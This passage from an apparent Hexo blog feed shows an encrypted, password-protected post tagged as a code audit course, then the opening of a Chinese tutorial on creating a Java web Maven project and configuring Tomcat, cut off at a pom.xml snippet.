834561adbd946cefd84fd9da804d77ac5504e6954e25e1aae4efb292fb36789db2bffe5bee6df6aec0d22d91a71df065b4624af7b2f0e8048b9b827ee5acb510800f70c7037c80a739054fb1f835a18e6f1ff311d884957b74eb4a44604d13aed467e143f0dde64102c414864b4a4b764ec421a9a0fff33095fd27e2f9787cfe571a7126cd578c7a4beb6515cc47ef1453096b7b9002e477fee942c62ef5f4c97f4a2d1cb346e888e4c4f246ffeca74ad47c830be899489f637f77bea8743cf555e49df2425894e1171c8d6dad8d16a937a721cf2c8515321dbc93eb0223fbf15b5c57c323155ab8f0121d538a68179cd2e52fef9a253208c19745dbf08563b01d7a1ce0686e6f0c6801cd1fa9ff0939a0cb58dfd298c13228ae5e7eea3dfd7b24e235db9bd2a63189e75c36c13c415047eab0296d1e259fb235418533b53055902fa15d48cf320ba1f8a5e57bf6d09408d74f86d6fabfd6d24a193b3e5e74d2159a30b90b4bc6b9dd972fd2075ccae326add0f0d76052992b86aa2232385c450b79388c6a1776d322d26277ba48b1b28c117f87298526663f2bd3eec07b40e223cdd82b8738455abab3daea6160b19db333cd8b16d873267ff2504dc3c4fe61fd608a5dae7f391cbf03f84441865227e71a730d3c2f0b770445f42ff595889e24afdf89fc01ae4928f604c451f1fc660cfb3230e40065418c35718174233dae6ad62c65cf0c95ed2b035f868cccfd2b94fcda0a9e574400341e9ec45e81028502a40a9fc3480af2eab09d1628a3232affdac21d1681bfa778704ccbb29ab319ea5c0fab27b87e217b08b6b2875b0d9a694d86e89314672ed7e3f3e289419803decdfb2a0706539167a694849d5897f9e1fa4a95aa7cbc0cb21fcfe79e6546e3bb54640965356abb026e4c0ba9ae56adda0b34f9b2d6c8a9a843961625d288ec0e6ed389c38de31dd4b0193b22f6e7627db94e89fe8255a22ab1a926c6c5611e52bc9c6f1e7de6ff669eebb03afa65bb44500a3e1aa61afa0734e5e2a6a373f2c9a3feb7773074b0e3fcda4a0c01c848623d093091c33151b4eaf8115c07dc5c13a421937e5f68efbe9cbb5237ea75152b0c03a6abc7abc21be52adf35ed5ab1447457f9078229232b9c3c72f49b33492a9c7cf058ea4469629bd0f80a0f836ff18d65be8e48c55ff44deefbc227aeee588e979e5c25708c64a8601c72236d05d7f3f4f29a9f2a9f9e9333bbd49c1180e6d3dcf11d857a1eb955e3ec270f7d200841392345ebec202585e21cb33549e531c51d02cc526a86a18a2a609fce1a54a0e9cdbefc685eb1b96b55403d63a2b28f76adfccfa37ac849b3540dd869f96d9f5bbade82570b90dff1ce7cf977270212aeb755274e2115ba5ded5478b1a1b92de0f1763dfa8c69f887e264cf360b746dba32af73ca84ee7b3662301cd6d0ed018a09f77fb4f25ae1176d4ac5cf41c692cdb069f154077b1d7eb08a563fad08398c065f84ab38c1e891333a96eef311f6aa88f3ef8f888067c2dea3bc2991c01a3707b65a080d968d299cd5cf81cd997f965075c44e0f80b1d0ae0808c91a1b78957050bdd89f0a5d782f4d4d4bde9419ed7a8b21864cc223da7f756b5282f590cb31d0ea1ef1361a5854f72c0d5c36da2034cafd22ec43b7c1f7413cd63bb7ffb95fb0ebd026c553a61d36e31a2be4931e5e071abf3fb5143af65aa2975c42fa6470bb0af9531e1e0a772d09770496b3de684bd48e407dfc9d6c4ff0019f64f9db6f7648764eeae713453d3db91705a8b02cb19082dc30907712fd38a54d452897de5d364f545e01f2eb9cc3b8dafba8b5d6901ea19d89a22d36cdf4dda0118931c3521b63a32a55b1b37e83750b35e3cec82e62b0d93e930ba136a4f6451deda4986e24c3d2551d4ba417ae86454b584793de613a28b820b439fa518a98451c474008d6462058b5ccbd11173d369a5a1de8ff642420451d1f6c2b013ee9e71b4ffbbddff5a3f6f5fe8d2ad4f6629f50d31a841e8c5cf68381e4df22bd862667993566e2526b57335bffe3d9292a07956ba0e443d0c984a875bb303526aeeff4e5a5f15655111f21b9da10f1398a90614ab0050e5c15f7485be6f4fbb5f0f9b91151cfe5e677980960ab8f7ce4b5d48b272ddf41aca86a4fa8e7752aa7a307dd787271ce359ca935bafa0f26038a590d17f65d45762eff38c81e92e80b1f36eb515c795e1b6a579f3f6e5bb860ddeac198ae88d3fa0ac6365d821923033877a0c8738de4c5dbd1aff5e58eda93cef9c217231c2b9388d38e697758d32ab894e1848317cbdb216f676ca84f895b4ac13d89dc10f21a2e56d0c2047b9fc9847872b7337ccc5e77ccc0052394a8f766db157fdc84ef9cd476ff9d075bb29c61781a69a69e5c7bda2a24a37db38d12dada3652e3ce973687c767b76cc670b1072c36c7208f031dc547accbba6c02fbd93ebbd488055a7b23de375a14922709c2f7636dcfdbc28095c320b2e11e71bd93007e159be82bd6b32fc72ea30915f8dfe244c2c1783895a44b4a78c530ede2686ab48dceee6879b901818c76be9b20e9d3f30f4ce55adf46d1a78735357ea23b59f9d44b9e999051d7e94facbed1ce030a07d54f620d2d748c7f99151151749fe7e7eea7fc462196e294b2c486fa4c506b305f61e50b7cf6d089cfd8dc2d91ed6027e2894931191ead20ec00373c5a92003a226f78f68abcb856ed4ae91f021498e6ab22e7384bcaef0f3220af6d575c5ef4ff067b4a66afef8c8bea7d5a04a743311e042e7737b4adeddd95415799c5f6e66b84f4a323561a69b968fe82fe5675fe01e044b7475cc0f41bf981cf78de22d74f648c5b22852f73a9c99366fecc63719af25900a5a7a614abb209f61926c8ba19f8c85a41fc3e1f080c0785da4ef39aed1fdfcb3f14ba073cc51a31a0bdfce71875f0e85582c5390512d07137a4300936f0f435f73d37dcd5d992664015419369a1438f180db043a60888b1b19ab277eaa6d5141eb0656a801a530456c72fe07d58a4dc93cd4c8eee5d3c37497a70f729a268904c93530696f8985684bdc4fff4a67a4d9ab3683ed9deb7428c3d7bdc3941cb08a5d9dd24dd6a7a4b13c5d96f5dfde69e71dd0484dbdf9bc6c7a0454d9ed713db94dfec99c5c1135f64bce593f36ea88f079ca28d8b451c50ec5df8f9529c6e5489d8592edb1e65f544f13f49cbe02fffa4ea99ce2e5132284ba3bf12153bb5daebb60434d8e0b1a7733e3f21853b8e95a1870fef46b4470659e645ae7c0533b9f006e3cc15cc57f1952ab27a82503bc0233d32b07b72383c6abb9972cc245eb73788755ecf1b62711ada6c216de091c36ae0119b40b538ed6088c15118bdaa5e0ce841f22530e48017d94131936786cb4c8bfb5128c42da3820f48c366455dc4900f496a83fd665f403679fb2048ba96710aeb6493776492e49947c1dce33982094ba0b62a160f556b44d989a40462dae951e99850b429a0f445011214a286c3cd6499ef53dd1b8fbf98a515166f5bf63d6b04e951306e86c98f947ae8a065287484f97d6044dadcf6532348f1cc65e609d85b5817535e7cf074128742d59e066cf629559869610ef2994e66006591e2de80fceaae2d22126366a161fe1fa9a7c148cc97a9cf06f439666a29f807ad332b8211053c8253927746c04aec6d217edbd5e2ba8e7c406d78222662816ced00819e2735a2b43058bd7d7ed0a0b5ade423318f46def6d11ef8a56d750b0b5832daf342d11b9fa75069d43fd32ec8bfa53b6022f4d3cd18ae6472c2860c2d71abd9fe3f5d51ac469e023ae28ca31276cd7264338f535c2ecad08dce7ff33c24cb0cdb80258f03d463374f73d0b1471961e8402e6db0dd496773e0a07ca90df0ade8ba466fd98fed0816f7d8237ace135e735bec94e0598c0988d93cb2103caafbf66b25c0ba9669e289fff7b7bf350315fd6a40151763170d957119e4c86588bf88e1cccadafadc5acc91585a64f5a58b420ea69fe4d2ac8db351aef6a0859ff4159f677072b4c3310f8b88f959dfeb8147c2aea0768b3ffacb562f43f0c5b3a2a882233889e304120e8ad1d184862587a8d53d1e60fe10bc1134a9f9e339c73e11a84a9ea65575fc08e73c050047eadcd3f29ed81f0708bedd703156e059bb95d4502cd33ec10fe0fdd680fa1b9d953a24a208992ecdfb4b8b6bcb282feb51748ec8498d6985c8928049c734077382dd633b910c006b1f7470ec3d24c61ff73800279a9b124391ab51ece46876fd3bab50cc7d149c326552ebca58012ed588f9a5b57dafa3f434bbc187862e40d306bd233dac125534994d80aae9a205f44a4cf8afdc79af09d8fa1991460c8eec61991a03dc5a2172d1d21e4a79841a7d9976a2d459e89d4a7d75a6bc5d3ec1add475b4492185a20241213b41067187a62a42916279cce5d01be045bdc66f2d5a44047d1eedbfd39d217583c0be403fdc890ad2e57fbb71df319989ef7888a03a68e5916faab4f97832de893a60291612cfc3b6e8410b31921dbbc96769ff3a640e1a5239335736f32d867e354451aabadc0eb917728bd628e49075bcb80d0aa5f8ca982ecbfd4af3698240780254dc5138e75118aa374388b0aea9f599f47d6df77d391fd69541bf96ddc763e2887f758fb967d20060c0e415154637d991e105158b34f1668584bb88f3cbb5240b84e671a72eaf44a8be891b31555f4bbf1f6096482c9f5b9f13add3cb59facf7664cd53e70b59ca523393a6adf6ed9608754fbc2e796e191f9b0172461ad78c8073f9ab30f15c34c2dd4ef72c9e23ca95b3d5875c0bd15d1e05bf09ad4b5e85ed9ee61110327c9130e84a59ba465c1831603867234b3736e6254ddedf87cb544bf57962f99d366e76388ac5ada06311f55d6593e66b6f1e8be0b3f82ebd0b9b31cf4be274a41429641d3d8ee9d9c7ce59b92c7c52075a2607dfa15d100150c446e7353bbbaabbebd31da8ae012051acafaeded6c391498fe6ddf5fb8f52c099483c52b6c656d279866f4287c9e230036502b5d13e210605d1cb554b866ab2e40dc4f4afb12d8e89bc2f23eeedaa32b8619e9fbf79fd3a2ebbd961c362b5e715b28238f68a5fef0124ae011dcc72380ac7a3fc64308f5c03ca86650b3f38afe3651d6eae3116f35d8e984469929e7147c4417a26c6a87e302c41eeb0d1d45c01376e3cc9a38fc18baa56b97ea95370cbbccb96181c507c9a706887b28a815cf1626396dd0b84c6f567b1566f4e34b8fb6a40c9a9bbc4e20fd90a1e4a4497d050b08cb0e48179361f48fd09ecc35cc6dbeafe2acdf48b58dc63551c314aaa9019a2af19ff37fa5984c0bba02089d176be2965854732996aee2886fac63b1e4d0590d34883c4fb72fa2d12848ef30066401ffec6e0bd3d657601e08a9cd4db2adad319c4889ea08e3dfc68cdbe50c42a0534f5fe0c9b37a12336faaa5c6ae54b038ecaa24a2ea65572ba190a18e3ed6baf75f89621db75e0924019cf1350420693b0602e39f5b5f2b0dfae2f48ac2504fbe2ff244a02834bab0baed08966512ca6e1acc4aafc85b1ca44a7b91992202274e2ffe59db7011b130a74eb9a18a14156a19f22eed0ded7f900666e19b09a99344d322837f75c280a1a0402e6b371259860c850177fb60b28ec523cf7c91acba9db2d17be04619ba85a45e9b6a9998a0c40951a7543087a36b1920f876cb6a629d55a98b11081ea811ba7cefb35e09371be0b72ffa85c3688ee9243cf9906756e9166b769111b0fdaf52fffd391836b35aa35798eccd16bab3a6b38567d14c7bb31132eed0f0180d9d777c1578e1da648f31d512463fac76f533e82dc6f17db0dc024c49fe16b6ec93b0a375a26aa524767c3c524f61e46ed6aae920ee07703bafff1e2a4c07df13d8effc1f4d36d7dc1b5d571090af2d43de0656ec8381ba0e3c36e8d97895efa4b422b34d25329866de86db7afb7f21819170df1dd7a167c4517402b4792a4aab3ec085a0d88cdee456913a312b0367c254a6bc78bdc8220bdef89df587bb1fcfea0f0927015d911e7a901eab1d84103e1c1fc00c17410e211e10525c7ed2ecae4deee8f2dbc1c01e4b6e8ac27c94220d371a97ff3a0866d6a58ef46105740fda2973753f56dfa65b07a9cdf87cc9be4e295d20b99fec8edd521ccb559e6629572bb373c83680535e9dae4808d274066ad30d1b4c37143e60fbec2140a8afabc9004b8d4bf8e412b9f6cfe3e531f878000bdb8db03afb50e153949f008685cfc3accb27e577288badbe88cd0742224721ea3ab50d11a0d23774f21c0e6890626adf24e1fc36884d69a9bc76ff78324cbe048a09c81df0f420c67939e80740e21744215e72d6b677dfc5eab9a038552da87e4139036bb60ecf8746758e3a8ba778e5f3fa3aca7b3bf92d2b8323581cecbdb2636600942f5e457df37307e099feb8404c56767fef838ec0ab2c504804a4415397403e7f0c8c2d31c460e0fb14e964443684532d418c6e08f963514297b325a8f12de1ef8301e3729c695eb33cd6cc1f76e04e5b58109fb6e618b2faab482136b859ead77b57a334b1f8750ec2f264da8bb451f0204bf387dc76eec09716981d170469aa2a34c715a0b556952776f91f9edce252ff8e9e59e4fb768be3976d7dbed587c9014fcb780d3afcb7eee61ce9db17681db52bcb5ee19775f808b9adcc11f61f96ab2b360b3596bf971f54024ce50004497b6e89289d75403f85c57042a1d1a5d72edbbc41d518708d3611f2d256d19c966430506cd56c372d08df2afcf593de59a754a65d43c33f51b1ece932d205039bd7d56b466b0e5187e71f1ea656aab03dd3e7b20139f1008dac29a091064e465e20df272033e0436b0ffc3a6d059db441416a6590c0f3244caf7ae8bf52c4f6015b29c0078417697e052f907a9bf6fe501fbdb8cb9b23ee42c48e7713516c9c0e5b75aeee5e6c38084d08501fa95dba32995ac0af8b1751c9943705ed67e52617d99ac7cc09216e89cccc62eecd0d792c5003790b1b5cf53aa38e14d9669ff470c8c6396a6e7df7937456683ee3810d1bd59b2c6fcb8e36d9a774307ef81367408d20bc59a4005f285fb845c8c9b6299098902ccef3450c66d2ca1b79082da599e10f9f54d58025bd197f407299996faf6e3f83926ce78972ea675916f5dea2ec41d1b966be353985aa69139df9d95b8dc5e8a6413c2dcb4ae5dd8fbe38cfe9fafb3d14b155db0b5554b54a170a0bf9baafbd8c9646810030733d99f7e997116063e8bcdcbce4e148efc81a89b92d54149576c7e74ef9b9446b2fae17ca3523164a57d783f242d2407989443ea79f4761102fef01e842e3e0ef9aa2f000070554ba35fd78fe64546143e07dae166f43787a3b692593bd9f34e36f2ad95f969550b046f69171ee35e64535d9d28648365c7e9482e4f705aeb2dba1e8188c91b8ef3776a190af6f88f3cf1400088064e60f8d50c2debee4973224f52cc0286ddf038910d608812547d3600f20ebcd5fe2839ec5d685306ab187432de337dc7201211872376d4c5f0810c9fa27c33c771cc0adfe37858b50460ed638d74d2109ef212abb49818fb0db7870022e4e6aada6413488394d9e767220f712c04e5b3b76b19ef8bc8533a985da2c4bee514a4757ef88e9c439e6c18cd59748f5ebf2f754c591540a01bb075074d7e6fb16be7a5d1d23ca191d71e286fcf22e294cb8bb7ef767585589cf0b2fa669267b88e07eb300b03e9991026c751ff43bc24d7a3e5ac9379619d2380e3a8e3a4176b1d84998ba63813aa030b626a3d8526380c2ce53eb2e1d05bdbab2f9db898d94a130bd09a703552b2af665ff82f6b59d23fc05c198779446e4ae68374694c2693c5ffaf54c294fa528fc9b864837f6d7973ca3ec1093ebd949b1d8387a3a1c49959ae3a6179d2185150390cc346474cd565df2c7e124f655cc67164c95e5969f0de4b6b93abb2fa59db78c536b591db02026e8c92e1082bc1ae140ec45c6029f7c9aa2fc37a7e94fc78ff4c42655c2ced1d31c55d09f97c4bdc203ab5575cbbb48099bfdae8f364124c4f0278ec273705560894e19a882bf4c16d169bb3aab9811404b5b0f3308e4845d32f6ce921b847d679ab9eebbb255b2779b5bb8387a0325d7245cfaa61deea497bb313c3fd6ad1ebe7e4bf4d36c43ddc28390593971c0db49ad37956192ffc8eb2af34af457b23b9cf5d3bfbcc54dc9ddb5a61c060980f70b377a05a17bc92b0b8f367c4464001e23ac156282c69a22e611283cf06896429e166b0f1596e91de37a766cc37e790adb146cfe02cabffb0f8ae3e4492c0e7113c9307fa40e222612d49e4e373b3cc50d2b0bed2b908a1bd186ca6c6fff178e5447e9e146a160c7548200feeca9b425443b1f54af93e35b6db7b579f00fe1065ae94b585da2d229554a8cd311bf6c759f4442330c9b17849dc332d06b3339975abb7ae2a06b7bfceac458247eea98f6ec2f04a8ca3754f6c041fbd3a7fb4d97095aa63be6c81cfe38e8904b5a42b24e651c2efa383894eb63aea3d383e59f3fca03e55193f2921fbf3c7a8c3195c5919a64cc17a1b9556d5b4a53607bdcbb1fd0807682f44f2fecbc92b4f1d7f0c967ec10aab0d5eb984617ca812cbc54b6d299077ac34a58483f6436ca6b304e7cd046e09a193cf424e08756fc240b108d117615a576b021c6552546806d6b71d7ba0db85b76a27fa78693efc0f47f15a44c021d279160e2bf1423a4b96fb2b55bad69e7ba952f4f208359b66e62e9498903c267a670cc21031eff73129eef0fc1dad9427db7b7072e2436e6fc7d9f6f3590fe5648d0b0dc41cff334f57707bf46ef76d6618a4a0756d72b9af3d940171927d47760f8dcb3e935667660a30697f6b66f51cea767cb67d3d0407703d32f20dc63aee4f26ed315bf14efb104cd7555c92f5bc4b4d7ece1fdea70f9737fce6ce3a95e3198e8c45f891c7b1622e0cdd5bff43e9cff83a80db4e413302c33af3ce238323b19edd009dca4a569bb5303f17f3d929bf11fc4afeff625aad6f0185cd833d275c4e93d06166d32c520987d35271a94ca63d8e559a042a2abe4531940fc822c1c6d44a0839355e0bf46dbdf897146db9a86d5e757c2ba5aa7ee9556dae459aebd97460c1caf9ca2ac5e653ac5ab0dc75b355f6f9647584fe3ac5534d740fc597a0baac2bebd9c3315c8844c6f1a129f9b250b5e7b2b6100d7d370178c522cb861bbd6c753dfdf7c6b8dca76dcbaf8ee072fcdd586d26afbaa28b7f20b1aaea4eb42e066d9eaaa00c3000cac583577d27e3ed287ecf6a47f22e77f93979682203b3661a89456f2c4e2636865a051663cc939cfedf6c4d98b2b94def0c2d18028dd742f48ceaff0b801711681b5dfb70239cfce64fd16f89b667aab7c0d7e4d362dc5dccb1a2b14baccf9974a230cc48c00290c850c28674b5fd9bff284575f665f975ed2e237ddf236d116943511abcf70206ebc4bacf420a65c7f04048dd01497f5c9c3dfc96a192e34e0699b8fb69022ce8274379320a79cc89c25ea9341424d8280091a52258719727330924df376765f65c15fcc59a4c8f980f8bbcb77518d357e425783543279fddbc400891bae609df7dd07adf42af371dfc066b8c552c73a162f6563a7e4de52641c3d73a8010ab43b3b428029597eb078451d4a468c5bcbede87cad013b829417e5f4181c9eb474cc03d763d8ddd4ecfc1ef23306b65ea30c676ea86db990294913fb4f30c83287e2fa72425278a628a0171a9972eb95e2b581080efbdd06337c21bc03cba777ecb6452e756580b18af536e6118b7f9cf1f592faa819b90ff12202998b311d18a3383faff087f8f1ffbd816f51b954c253773fa22670e630616951154ee8bae225e0e5b78df87d22ec915143b6f0b93a5236bd34030013deee8c5707ae7626a468bfadba8fcfef2fdd6eec3305681282fd762654f0e8cf9c4ee9db85d2ffb27cb0b681c374102a086914f9d15610111f766e61e501be55484e78be53f0324f1e495c715667d3ead1a820f1bd311efbb0a968fc3f3aaa787a7b2c75522768203a14b88c475bea450007ac85f698cf1e1fa4c3f76772b57cc8af825d98015af4dfabae883448abbc7c5f6771dd292fca300e3b578a5fb9a9b5a7b80b84f27066205de53c5917854e133b3e14d3ed0007711476d9b87f4394d1f01113d49e6ad1adadbdf27637d3ed78ca148e291ac08b6b181a46f918728698728d7a25d8c2156ce79867ed22a063b6bf8db1037a0f8da8a2a9fe07c3038d099b07655a36bdd1e8b50aa3afd60f6aba2ef6d20de03269664d86ec3b104419764de68a9ff687ace7514316c3befef14becf3247df65900688e54d9ee41cc74e69fb481a95502bf0902439f93f90cb9c1874ccc53a13aadeb7f2c5c1fc5b05e1d2de148ff235e5459d5879d5beee53e2dac54e23cac645ed0b5790df65f02850da79542f064518c119fd8a9d9b51c79f2205ecdd60c7bce681358f31a8069d7623cf25bceff9738c1478e196b440c80ab18d2d108cbfbfe32369199043595583d6c698b80a7ea102ea1c6a161a443bc612c616fa84a7673138fef2cd5ec2973c523430010ca6b01fa605ce926bc0ac50614cee2cc2f9c5f13269d384177022fc3a8ca5d126b202a5fd8eb76047b9283bf6ef8eb39c557978945a873804878155e5e5771d0710440bcab44e2e5dfea11da5cb0ae0343a5aac2e458b1689c4d5304fdcb6ed791b1c88bde09034fa2cfe0470ecf65ab4a1a42eb535d12d6d83d5e4485c707d9864e12e5cd963acf8f11fd75b1295ce536b5548144c6bf93ddc8e4db429ffde3058e2d7e45a7c981128669997a87f3a11ce1950296d97bd67f768f8d147e4e5eb82307a455f2635dbe184fc4dabf83cef0cc0df08ce09efd8aa138956725665b508616596929e2ae9baf73c060be670f90a14fe4c3876d258a00265f406a46575909b0eadb2c3f112fd0dc3f5dfac10043d573df29cfd01e13a9755599155a1faded3c197e734949ef8ac7a1ade0878ddb404b6a37185230ad33c36421ce1b5f470fac6bb32e1936cc5358cce894fbdb184b52137cd9deb720c3a421e9864ce108085de16ad978f62a583d8c9bf3129dea15343b960b00481e4efa024caa5665d63e3c56cc58805e54c66a8b021d51487561e9d34f8606d70a5149234648cf27481139b5788ed52d1a56dac96b2dc9a71ee4406c7ee6f47102f2b98cc22abfbdc803efdc354ba7a04ae4248e095f44231e35fdc8d13c207a12f5136dc9e40216912dde1c9ce375668906b9f21b450a7c727107bb3aa708d52bda08da061de17fc1dea6c6d667759d4f8379ea81714f71cfed9b86bef56c9080a45cb62e2eb8acc02ab55d7e6c6ed506ff8f51bd805ddab3ae179bbbe4e00a282bbf61b1f18352d8dcc5125f43b70c03a80f854f6b82e0471ef8fbcfc3f77f6e5e9adfffd5ffbc0c8e135d18084e5a4bb88f50ab943da31fee564f9236363329fa6b90a51e143fa20c5981280beecd6c8df566954be0c7909172c061bb5d96bc6273875c5b62f74e9be754ed06e52933296a2731de64e4d9226a4fabe69f5e9f58332bccbb3fe5eb7f281a06f9a5a19825d7ed1234471d03c7a7920928153e034ab14bad292d5dd74c138f72cc47a47a5f3f0f0c538633b0f5219601caa72a824cc2728d2094ee1ee6d1ae613a52c4236a148f8a9c90dfc7734dad0239ca3eb4cc1eb06dd9dd4b208e8e0ad8d6a41d3c6107a00c4c407bec522ed5db3a0834f30f28e2fdf40354dfa609b3df6ac2b8bc5080d518afbba4ae02311823e03250026ae9f1e4482553f8e0cdc5aa310b645e2191c6d925b8d68dc29c8ad37932c52cde512daa06d31d3e878a6b9838f7edcafc5312cf5d82966cdb582723165ebca4bf4506c113d9920ef3110e13a5728495ab8f463eec14ce53676cea679b2ad12ee79800addad29b2d674bd71d6b93724dfc32970b9f750a0c5dead5e018bcfdcb10145f5c6648e23a5e6255dcdc5542bfa11430c2cb91e114cbefc888e8ef9c6afb8686b3295eac674c506789c60e9840e78b3df92872be518b5305e52c05def7238731eaf31c02ed8f2985343ed8c77bd0c1086bf5543ea93edada507eb26bd542d5d0605d67c92b4dedb958ddf93d170d5566f5a21156fd7b6865b202f053385f9b0155a3cab4949edf269a039ea89d1122975fab835a8d2eb29929b355146fb64b41edbff329791b1cd9f86ea7657e484722c646bc8fe6536fe4660a68a853e9c699112bc7cdf88e86a795434e8be8bf6fbb799fcd637f48891108a05bcf7fea564c1192d91a0905c74234fe2197c2eeeab1ab2fed99b14021a77b6316a39bfaa418340d6587a80e2a2d236b69c9a48dbf73cee1334331e20ad18e9bf9a65edc4b4f6157b0e447e3b219bc26a587c537bb8a4c4976dcd34a9701355a2aac47a64a7b92c7e81ee262913c3b59d114840f8025ae954300a64ca64d8b4b6df51c58cf84a5182dff8719ef0005e0501ef42cb3ba0273fe42cb4a202b34d187f1a8a9284ae8199f6fa91ffc2f6c1d8fa9e43663a3146aa7ef7094e95561ee0377ee421372d2fdcf13f9b338b3181372131b0d8bbc9b3ab3b1e6e7fac5dd3318b6b852311527eac15d8e3cd6d4f8418fd487dd737454d36a167107f7f9b542db2bd710d98c9959d85e878cc9505108f6493ea0b3653dc90465d03759e83c006109e984c271b46679a8d73c9c2336c1500c84111ff9e7430e0f4c95797f49c578e495aeb5641cdacf4dbf71899208e337d69f6cd9450cb304153ab65957eff140f74d367589355f66a2c2eb42b6550c19fe0f0cafda69b64e03a9e2099a93a7ecac18f8c8a6a3b981ec9bbee3510c7b54d104c8acde0e51441e8fad00c682189f8b363f8ff44297aa92a27c4b10778b5a90299ad70685299288c90e3be23a8d137442063a503bc42f15312500567f61d94d395cfbff116fa32ea74a56a35cb85ed8b74698262d10724c03cb3378114db52a6e66fd5dcc150e5370f34811babe9b9475f1fa5c9b33b9d97b72c222b6fd15bdbd77c7b66f45f5d365f48a1556a99b691fa99d89a54372f2ff2298abc0e60ea82c10ed12b542a62fa461432e77eacd2123c95c7700f2381ed0799b066ec2e7ecf53485ba417cde21ffdff0fe33bec0cb6c87e49d761a6f980f42270be695871f6057af1383d2bcda4c93da60dbd3b95d6eb73baf724056e2392023e1b468961521898b6527fa7c747dbfab04e756f41950c0d0580c9ace0034ee0c066bcdd8a4d8c2e2141ccd6ce3a58dab200d59efcfbd4d97cab86109098e2f99ceb93518a074f0fec4c4848d510b1eb14f2af431dd532ae89b3f211d80935e5c80f6f492759853dfb59f494b971752aae6501ca3983dcf4cb425e34ad629994b56c627effb08ddacabb19df0e45b0c94b93f376ce0f1fdbd03dcf8165e933fed5bd81a8bf13d41aa169f269eca78ccfca86a7b345251a12588442808b983112633313b7d2cf62057af52858f73a0a3b20b8c786afff9f3d9478e2c0a85f29a2f7e1e8f7778309a50a24e86ebf031daf0588cea9155c3b5874ce6f4cf30d8a517a757a79cb43c8bbf9a7ea8f36e5a442ebc6922fb8d31c54fd94317b0a4da07fd7bd4db310acbbdcdf32464c5a7cc089328fbc1a4ca1fbb98fe44150d6f2e810283f405bf279a5412c1a3015d2a85f5fbea1d1ec4b967879c7d9cddb0cd9487c1aeeec99d10bab157f050502a23198e8ec34b11d5ff936d4661545f4d867cea712da069acecb6f2fadb74d85749b2a0148b8029cc06507ac06f6418f4168aca6d39830b713e6970ea6f7734ec91de1dbfa498aec8da73069bb331ca9f4c185b50a2c26ef05bf1745a3aef0ba780b5d34193ae8ebfeadd9bd745b153cdf82726aee5e677a0e0afd6e3491d83b958b9166a6c5ed6f1a7fbf522c716a108b0efa9d08483a64de6a2d639e370b7ac61e024f9dff28b47b13c5646c8d97f7ff90ed2cb791c9631708b8b183bce14ac71a956eb3f51e25f5e49d5acff80af2dddda1a7ffb26cd9a93e1f07721007840819eb5d9648b0fac0aafc75ace616645b07030426d8df7f595e80e1229d9228d3dc60ec05a9975288dbeea0708f068b14bb548d4848f6f913bf7064b1cb5986490929d5eee42ff30308d94d4551fdced752247658e23eaf51dd24a64768088dbb9661ff19cca37d4e485b9bcd362f405979ff396e1102870e99564ddd7a27659f06ec9548bff012dcbb580830f1275d69324e0bda9fd9fc81a01e3c1607a248aaf3bb141b47a59512db7c89ec29105f06bb8153c3ea3e78017294ecd778d7aca9f20e7a42fee57521828fd54fd79087df742a9e0012f7697222a69a2d47cc13e266a6ad158f5b5bb251c755e377f6c4268480003c6975008a4741339938aea7418bbf7437270a32d9303393afd2bc5b3336fde63d079d72a92524b29ecdee26029ed3500af8e368347a40cafa4f6906ceb8f875cf90e75e7e455c0c1f51f34155e19f415540fbd69d66fa8967cc0ef6d586b8d367c4410f75a77c90422aaaaa740e461a43f4e481e3f385795dfa0cf2c1af7bc92dbdf0737de47170c8251338a98385999ad51f1095ccbd1be51355a9da5e768223bedf73b8ad87f6f3f2c3eddbc25b191dddf7289db46e6d20fe49a8d73accfc44d76fb339489af459468c22c9e73291adc934e641624a81fa6d355cc54cdca8bbfbecc68292e0e982f61a602aa005f4a355e142ea78047ac0375bf7cdaa59cb3d721d3d391f22896fd20bcbe95043708527b22bf37b0c45a6a17d444652ff437cc8b5f4dd24e6febaf90085101349055b7788bdaf32f5d3af56b0f807e325d817d3b82f1d134aa2bfb73d458b6c7544998852481cf9799e13878c59ad991c3c31fb469dacb096c8d2f70bf986d339db24e79ec4ad1dfcca103209140fdef63c8138b06bafd9f216297d1971503a2a9b52a5e8328c1d2265a9840cfcdfdae75af1a14865c181f9b81663917d961ef236b15b6a7482a720fcc5dba28d5b887df7667a6ae551ae095953c7aa9d665b102e679a6b3fb813965c07c93ea13f43750b4eb2ebb18964fab090983ab8d3f9fabab4780e48d88e22f27e184b34d6dc4e6d6e8aaae3ec9cedaf2c1a7540a36a086bb9603280b5706ee9c3f1b5d1e3063c2bf221b08d7331e9ea9bb41b07cb9abf7fc6719f479a8410991ecc2cfb7b680181663063b840cca89bcdc917e8a99</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA代码审计-JAVA WEB基础(一)</title>
    <link href="/2023/09/05/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%20WEB%E5%9F%BA%E7%A1%80(%E4%B8%80)/"/>
    <url>/2023/09/05/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%20WEB%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA-WEB基础-一"><a href="#JAVA-WEB基础-一" class="headerlink" title="JAVA WEB基础(一)"></a>JAVA WEB基础(一)</h1><h1 id="一、创建JAVA-WEB-项目"><a href="#一、创建JAVA-WEB-项目" class="headerlink" title="一、创建JAVA WEB 项目"></a>一、创建JAVA WEB 项目</h1><h2 id="1、创建项目"><a href="#1、创建项目" class="headerlink" title="1、创建项目"></a>1、创建项目</h2><p>新建项目:</p><p><img src="/image/image-20230720201539556.png" alt="image-20230720201539556"></p><p>选择 Maven 项目，后选择 maven-archetype-webapp ，名称处为自定义项目名，如下图所示：</p><p><img src="/image/image-20230720201931775.png" alt="image-20230720201931775"></p><p>创建成功后项目目录如下：</p><p><img src="/image/image-20230720202107106.png" alt="image-20230720202107106"></p><h2 id="2、配置Tomcat"><a href="#2、配置Tomcat" class="headerlink" title="2、配置Tomcat"></a>2、配置Tomcat</h2><p>pom.xml 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 